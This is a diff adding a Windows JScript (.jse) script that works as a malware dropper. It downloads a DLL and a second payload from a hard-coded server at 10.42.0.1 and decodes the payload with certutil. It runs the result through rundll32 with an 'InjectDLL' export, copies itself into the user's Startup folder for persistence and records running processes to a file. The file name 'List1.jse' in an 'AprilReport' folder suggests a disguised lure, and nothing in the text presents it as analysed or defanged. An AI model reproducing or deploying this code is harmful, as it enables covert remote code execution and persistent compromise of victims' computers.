@@ -1,0 +1,81 @@
+var objShell = WScript.CreateObject("WScript.Shell");
+var colSystemEnvVars = objShell.Environment("Process"); // Calls environment method to get variables
+var x = colSystemEnvVars("TEMP"); // Gets the path to TEMP
+var fso = new ActiveXObject("Scripting.FileSystemObject");
+var filePath2 = x + "\\" + "List1" + ".jse"; // filepath to check for
+var randomNum = "3583241215";
+var outModule = x + "\\" + randomNum; // filepath and filename of downloaded file
+var outDLL = x + "\\MessageDLL.dll";
+
+//Runs if the file is in the TEMP folder
+if(fso.FileExists(filePath2)){
+url = "http://10.42.0.1/MessageDLL.dll";
+  WScript.Sleep(2000);
+  var request = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+  request.open('GET', url, false); 
+  request.send();
+  if (request.status === 200) { // OK
+    var stream = WScript.CreateObject('ADODB.Stream');
+    stream.Open();
+    stream.Type = 1; // addTypeBinary
+    stream.Write(request.responseBody); //Writes response data from url to stream
+    stream.Position = 0; // Sets back to stream position 0
+    stream.SaveToFile(outDLL,2); // Option 2, overwrite if existing file
+    stream.Close();
+  } else {
+    WScript.Quit(1);
+  }
+var uname = objShell.ExpandEnvironmentStrings("%username%");
+var stPath = "C:\\Users\\" +uname+ "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + randomNum + ".jse";
+WScript.Sleep(2000);
+objShell.run("certutil -f -decode " + outModule + " " + outModule +".dll",0);
+WScript.Sleep(2000);
+fso.CopyFile(filePath2, stPath,0);
+var objShell = new ActiveXObject("WScript.shell");
+WScript.Sleep(2000);
+objShell.run("rundll32.exe " + outModule + ".dll" + " InjectDLL",0);
+WScript.Sleep(2000);
+}
+//Runs if the file is not in the TEMP folder
+else{
+url = "http://10.42.0.1/malFile";
+var filePath = "C:\\AprilReport\\List1.jse";
+
+  WScript.Sleep(2000);
+  var request = WScript.CreateObject('MSXML2.ServerXMLHTTP');
+  request.open('GET', url, false); 
+  request.send();
+  if (request.status === 200) { // OK
+    var stream = WScript.CreateObject('ADODB.Stream');
+    stream.Open();
+    stream.Type = 1; // addTypeBinary
+    stream.Write(request.responseBody); //Writes response data from url to stream
+    stream.Position = 0; // Sets back to stream position 0
+    stream.SaveToFile(outModule,2); // Option 2, overwrite if existing file
+    stream.Close();
+  } else {
+    WScript.Quit(1);
+  }
+
+ WScript.Sleep(2000);
+ //The following block gets all the running processes on the current machine and displays them
+ var strComputer = ".";
+ var objWMIService = GetObject("winmgmts:\\\\"+strComputer+"\\root\\cimv2");
+ var runningProccesses = objWMIService.ExecQuery("SELECT * FROM Win32_Process", null, 48);
+ var objItem = new Enumerator(runningProccesses);
+
+ //Creates a file to put all the running processes in
+ var textFile;
+ textFile = fso.CreateTextFile("c:\\AprilReport\\sysProc.txt", true);
+ textFile.WriteLine("Win32_Processes") ;
+ textFile.WriteLine("-----------------------------------") ;
+ for (;!objItem.atEnd();objItem.moveNext()) {   
+ textFile.WriteLine("Name: " + objItem.item().Name) ;
+}
+textFile.Close();
+
+WScript.Sleep(2000);
+//Copies current file to new directory and runs the file in the new directory
+fso.CopyFile(filePath, filePath2);
+objShell.run("cscript //nologo " + filePath2,0);
+}
